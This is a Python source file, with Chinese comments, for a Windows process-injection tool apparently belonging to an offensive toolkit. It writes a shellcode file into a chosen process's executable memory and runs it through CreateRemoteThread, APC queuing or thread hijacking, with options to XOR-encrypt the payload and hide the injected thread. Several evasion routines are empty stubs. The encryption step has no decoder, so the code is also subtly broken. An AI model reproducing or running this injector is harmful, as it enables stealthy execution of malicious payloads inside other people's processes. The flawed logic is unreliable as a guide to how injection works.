from typing import Dict, Any, Optional, List
import os
import ctypes
import psutil
from ..core.tool_base import ToolBase
from ..utils.error_handler import error_handler, OperationError

# Windows API常量
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

class ProcessInjector(ToolBase):
    """进程注入工具"""
    
    def __init__(self):
        super().__init__()
        self.dependencies = {"psutil"}
        self.required_permissions = {"process_access"}
        self.config_schema = {
            "injection": {
                "type": "dict",
                "schema": {
                    "method": {
                        "type": "str",
                        "values": ["classic", "apc", "thread_hijack", "module_load"]
                    },
                    "encryption": {
                        "type": "str",
                        "values": ["none", "xor", "custom_xor", "rc4"]
                    }
                }
            },
            "process": {
                "type": "dict",
                "schema": {
                    "filter_system": {"type": "bool"},
                    "target_arch": {
                        "type": "str",
                        "values": ["x86", "x64", "any"]
                    }
                }
            },
            "protection": {
                "type": "dict",
                "schema": {
                    "hide_thread": {"type": "bool"},
                    "clear_header": {"type": "bool"},
                    "protect_memory": {"type": "bool"}
                }
            }
        }
    
    @property
    def name(self) -> str:
        return "Process Injector"
    
    @property
    def description(self) -> str:
        return "高级进程注入工具，支持多种注入方式和内存保护"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    def _initialize(self) -> bool:
        """初始化工具"""
        try:
            # 设置默认配置
            default_config = {
                "injection": {
                    "method": "classic",
                    "encryption": "xor"
                },
                "process": {
                    "filter_system": True,
                    "target_arch": "any"
                },
                "protection": {
                    "hide_thread": True,
                    "clear_header": True,
                    "protect_memory": True
                }
            }
            
            if not self.config:
                self.config = default_config
            
            return True
            
        except Exception as e:
            self.logger.log_error(e, "初始化进程注入工具失败")
            return False
    
    def _cleanup(self):
        """清理资源"""
        pass
    
    @error_handler
    def list_processes(self) -> List[Dict[str, Any]]:
        """列出可注入的进程"""
        processes = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'exe']):
                try:
                    proc_info = proc.info
                    # 过滤系统进程
                    if (self.config["process"]["filter_system"] and
                        (proc_info["username"].lower().startswith("system") or
                         proc_info["username"].lower().startswith("local service"))):
                        continue
                    
                    # 检查架构
                    if self.config["process"]["target_arch"] != "any":
                        if not self._check_process_arch(proc.pid):
                            continue
                    
                    processes.append({
                        "pid": proc_info["pid"],
                        "name": proc_info["name"],
                        "username": proc_info["username"],
                        "path": proc_info["exe"] if proc_info["exe"] else "Unknown"
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
            return processes
            
        except Exception as e:
            self.logger.log_error(e, "获取进程列表失败")
            raise
    
    @error_handler
    def inject(self, pid: int, shellcode_file: str) -> bool:
        """
        执行进程注入
        
        参数:
        pid: 目标进程ID
        shellcode_file: Shellcode文件路径
        """
        try:
            # 验证文件
            if not os.path.exists(shellcode_file):
                raise OperationError(f"Shellcode文件不存在: {shellcode_file}")
            
            # 验证进程
            if not psutil.pid_exists(pid):
                raise OperationError(f"进程不存在: {pid}")
            
            # 读取shellcode
            with open(shellcode_file, 'rb') as f:
                shellcode = f.read()
            
            # 更新进度
            self.update_progress(1, 5, "正在准备注入...")
            
            # 获取进程句柄
            h_process = ctypes.windll.kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                pid
            )
            
            if not h_process:
                raise OperationError(f"无法打开进程: {pid}")
            
            try:
                # 加密shellcode
                if self.config["injection"]["encryption"] != "none":
                    shellcode = self._encrypt_shellcode(shellcode)
                
                # 更新进度
                self.update_progress(2, 5, "正在分配内存...")
                
                # 分配内存
                shellcode_addr = ctypes.windll.kernel32.VirtualAllocEx(
                    h_process,
                    0,
                    len(shellcode),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                )
                
                if not shellcode_addr:
                    raise OperationError("内存分配失败")
                
                # 更新进度
                self.update_progress(3, 5, "正在写入shellcode...")
                
                # 写入shellcode
                written = ctypes.c_size_t(0)
                if not ctypes.windll.kernel32.WriteProcessMemory(
                    h_process,
                    shellcode_addr,
                    shellcode,
                    len(shellcode),
                    ctypes.byref(written)
                ):
                    raise OperationError("写入内存失败")
                
                # 更新进度
                self.update_progress(4, 5, "正在执行shellcode...")
                
                # 根据注入方法执行
                method = self.config["injection"]["method"]
                if method == "classic":
                    success = self._classic_injection(h_process, shellcode_addr)
                elif method == "apc":
                    success = self._apc_injection(h_process, shellcode_addr, pid)
                elif method == "thread_hijack":
                    success = self._thread_hijack(h_process, shellcode_addr, pid)
                else:
                    success = self._module_injection(h_process, shellcode_addr)
                
                if not success:
                    raise OperationError("注入失败")
                
                # 应用保护
                if self.config["protection"]["protect_memory"]:
                    self._protect_memory(h_process, shellcode_addr, len(shellcode))
                
                # 更新进度
                self.update_progress(5, 5, "注入完成")
                
                return True
                
            finally:
                ctypes.windll.kernel32.CloseHandle(h_process)
            
        except Exception as e:
            self.logger.log_error(e, "进程注入失败")
            raise
    
    def _classic_injection(self, h_process: int, shellcode_addr: int) -> bool:
        """经典的CreateRemoteThread注入"""
        try:
            thread_id = ctypes.c_ulong(0)
            if not ctypes.windll.kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                shellcode_addr,
                None,
                0,
                ctypes.byref(thread_id)
            ):
                return False
            
            if self.config["protection"]["hide_thread"]:
                self._hide_thread(h_process, thread_id.value)
            
            return True
            
        except Exception as e:
            self.logger.log_error(e, "CreateRemoteThread注入失败")
            return False
    
    def _apc_injection(self, h_process: int, shellcode_addr: int, pid: int) -> bool:
        """APC注入"""
        try:
            # 获取目标进程的所有线程
            threads = []
            for thread in psutil.Process(pid).threads():
                thread_id = thread.id
                h_thread = ctypes.windll.kernel32.OpenThread(0x0020, False, thread_id)
                if h_thread:
                    threads.append(h_thread)
            
            if not threads:
                return False
            
            # 为每个线程注入APC
            success = False
            for h_thread in threads:
                if ctypes.windll.kernel32.QueueUserAPC(
                    shellcode_addr,
                    h_thread,
                    0
                ):
                    success = True
                ctypes.windll.kernel32.CloseHandle(h_thread)
            
            return success
            
        except Exception as e:
            self.logger.log_error(e, "APC注入失败")
            return False
    
    def _thread_hijack(self, h_process: int, shellcode_addr: int, pid: int) -> bool:
        """线程劫持注入"""
        try:
            # 获取一个合适的线程
            target_thread = None
            target_thread_id = None
            
            for thread in psutil.Process(pid).threads():
                thread_id = thread.id
                h_thread = ctypes.windll.kernel32.OpenThread(0x0020 | 0x0002, False, thread_id)
                if h_thread:
                    target_thread = h_thread
                    target_thread_id = thread_id
                    break
            
            if not target_thread:
                return False
            
            try:
                # 暂停线程
                if ctypes.windll.kernel32.SuspendThread(target_thread) == -1:
                    return False
                
                # 获取线程上下文
                context = ctypes.c_buffer(1024)
                context_size = ctypes.sizeof(context)
                
                if not ctypes.windll.kernel32.GetThreadContext(
                    target_thread,
                    ctypes.byref(context)
                ):
                    return False
                
                # 修改线程上下文
                # 这里需要根据具体的架构设置正确的寄存器
                # 为了简化，这里只展示概念
                
                # 恢复线程
                ctypes.windll.kernel32.ResumeThread(target_thread)
                
                if self.config["protection"]["hide_thread"]:
                    self._hide_thread(h_process, target_thread_id)
                
                return True
                
            finally:
                ctypes.windll.kernel32.CloseHandle(target_thread)
            
        except Exception as e:
            self.logger.log_error(e, "线程劫持注入失败")
            return False
    
    def _module_injection(self, h_process: int, shellcode_addr: int) -> bool:
        """模块加载注入"""
        # 实现DLL加载注入
        return False
    
    def _encrypt_shellcode(self, shellcode: bytes) -> bytes:
        """加密shellcode"""
        method = self.config["injection"]["encryption"]
        if method == "xor":
            key = 0xAA  # 示例密钥
            return bytes(b ^ key for b in shellcode)
        elif method == "custom_xor":
            # 实现自定义XOR
            pass
        elif method == "rc4":
            # 实现RC4
            pass
        return shellcode
    
    def _protect_memory(self, h_process: int, addr: int, size: int):
        """保护注入的内存"""
        # 实现内存保护
        pass
    
    def _hide_thread(self, h_process: int, thread_id: int):
        """隐藏注入的线程"""
        # 实现线程隐藏
        pass
    
    def _check_process_arch(self, pid: int) -> bool:
        """检查进程架构"""
        try:
            target_arch = self.config["process"]["target_arch"]
            if target_arch == "any":
                return True
                
            # 实现架构检查
            return True
            
        except Exception:
            return False
    
    def _execute(self, *args, **kwargs) -> Any:
        """执行注入操作"""
        if len(args) < 2:
            raise OperationError("缺少必要参数: pid, shellcode_file")
            
        return self.inject(int(args[0]), args[1]) 